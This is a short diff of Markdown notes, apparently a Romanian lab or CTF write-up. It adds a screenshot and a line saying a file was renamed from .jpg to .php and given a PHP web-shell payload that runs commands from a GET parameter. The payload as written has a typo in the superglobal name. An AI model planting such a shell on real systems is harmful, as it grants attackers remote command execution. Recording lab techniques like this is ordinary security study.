@@ -1,2 +1,5 @@
 ![](../../attachments/Pasted%20image%2020261019185830.png)
 ![](../../attachments/Pasted%20image%2020261019185851.png)
+![](../../attachments/Pasted%20image%2020261019185938.png)
+
+Am modificat `.jpg` in `.php` si am adaugat `<?php system(_$GET['command'])`
